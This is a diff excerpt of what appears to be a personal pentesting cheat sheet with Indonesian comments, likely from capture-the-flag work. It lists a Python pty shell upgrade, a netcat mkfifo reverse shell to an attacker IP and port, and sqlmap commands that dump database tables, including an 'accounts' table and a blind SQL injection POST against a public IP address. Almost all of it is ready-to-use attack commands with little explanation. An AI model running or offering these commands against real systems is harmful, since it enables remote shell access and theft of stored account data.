@@ -7,12 +7,12 @@ check service service --status-all => bisa untuk revshell atau tahap deffense
 python3 -c "import pty;pty.spawn('/bin/bash')" => bisa untuk interactive shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f
 
-
+# sql map
 sqlmap -u "" --current-db => bisa untuk dapetin database
 sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables
 -D soccer_db -T accounts --dump
 
-# with url
+## with url
 sqlmap -u http://167.71.207.218:50621/logins.php -X POST --data "username=foo&passw0rd='*&login-btn=" --batch --tamper=randomcase,space2comment -D web_blindsql --dump --time-sec 1 --threads=10
 
 
